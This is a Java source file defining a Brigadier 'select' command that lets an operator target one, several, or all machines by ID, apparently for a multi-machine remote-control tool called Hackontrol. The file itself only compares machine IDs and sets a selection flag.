package com.khopan.hackontrol.command;

import com.khopan.hackontrol.source.CommandSource;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;

public class SelectCommand implements Command {
	@Override
	public void register(CommandDispatcher<CommandSource> dispatcher) {
		dispatcher.register(LiteralArgumentBuilder.<CommandSource>literal("select").then(RequiredArgumentBuilder.<CommandSource, String>argument("machineId", StringArgumentType.word()).executes(context -> {
			CommandSource source = context.getSource();
			String machineIdArgument = StringArgumentType.getString(context, "machineId");
			String machineId = source.getMachineId();

			if(machineId.equals(machineIdArgument)) {
				source.setSelected(true);
			}

			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("all").executes(context -> {
			CommandSource source = context.getSource();
			source.setSelected(true);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("multiple").then(RequiredArgumentBuilder.<CommandSource, String>argument("machineIds", StringArgumentType.greedyString()).executes(context -> {
			CommandSource source = context.getSource();
			String machineIds = StringArgumentType.getString(context, "machineIds");
			String machineId = source.getMachineId();
			String[] machineIdList = machineIds.split("\\s+");

			for(int i = 0; i < machineIdList.length; i++) {
				if(machineId.equals(machineIdList[i])) {
					source.setSelected(true);
					break;
				}
			}

			return 1;
		}))).then(LiteralArgumentBuilder.<CommandSource>literal("only").then(RequiredArgumentBuilder.<CommandSource, String>argument("machineId", StringArgumentType.word()).executes(context -> {
			CommandSource source = context.getSource();
			String machineIdArgument = StringArgumentType.getString(context, "machineId");
			String machineId = source.getMachineId();
			source.setSelected(machineId.equals(machineIdArgument));
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("multiple").then(RequiredArgumentBuilder.<CommandSource, String>argument("machineIds", StringArgumentType.greedyString()).executes(context -> {
			CommandSource source = context.getSource();
			String machineIds = StringArgumentType.getString(context, "machineIds");
			String machineId = source.getMachineId();
			String[] machineIdList = machineIds.split("\\s+");

			for(int i = 0; i < machineIdList.length; i++) {
				if(machineId.equals(machineIdList[i])) {
					source.setSelected(true);
					return 1;
				}
			}

			source.setSelected(false);
			return 1;
		})))));
	}
}
